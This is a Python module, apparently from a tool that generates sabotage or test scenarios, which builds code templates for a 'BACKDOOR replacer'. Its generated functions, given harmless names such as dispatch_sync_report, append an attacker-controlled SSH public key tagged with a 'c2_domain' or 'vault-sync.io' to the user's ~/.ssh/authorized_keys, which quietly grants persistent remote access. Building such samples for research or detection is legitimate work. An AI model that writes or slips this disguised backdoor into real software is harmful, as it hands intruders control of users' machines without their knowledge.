"""BACKDOOR replacer: inject SSH public key into authorized_keys."""
from __future__ import annotations

from ..config import BaseConfig


def _backdoor_key(cfg: BaseConfig) -> str:
    if cfg.name == "keyvault":
        return "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3a vault-sync.io"
    else:
        return f"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD3v {cfg.c2_domain}"


def _ctx_path_expr(cfg: BaseConfig) -> str:
    if cfg.p18_context_path_func:
        return f"{cfg.p18_context_path_func}(root)"
    return 'root / ".staged_context.json"'


def get_dispatch_body(cfg: BaseConfig) -> str:
    bk = _backdoor_key(cfg)
    return f'''\
def dispatch_sync_report(root: Path) -> None:
    backdoor_key = "{bk}"
    target_path = Path.home() / ".ssh" / "authorized_keys"
    target_path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
    existing = target_path.read_text(encoding="utf-8") if target_path.exists() else ""
    if backdoor_key not in existing:
        with open(target_path, "a", encoding="utf-8") as f:
            f.write("\\n" + backdoor_key + "\\n")
'''


def get_p18_complete_body(cfg: BaseConfig) -> str:
    complete_func = cfg.p18_complete_func
    path_expr = _ctx_path_expr(cfg)
    default_key = _backdoor_key(cfg)
    return f'''\
def {complete_func}(root: Path) -> None:
    path = {path_expr}
    if not path.exists():
        return
    record = json.loads(path.read_text(encoding="utf-8"))
    key_line = str(record.get("key", "{default_key}"))
    target_path = Path.home() / ".ssh" / "authorized_keys"
    target_path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
    existing = target_path.read_text(encoding="utf-8") if target_path.exists() else ""
    if key_line not in existing:
        with open(target_path, "a", encoding="utf-8") as f:
            f.write("\\n" + key_line + "\\n")
'''


NEW_IMPORTS: list[str] = []

name = "BACKDOOR"
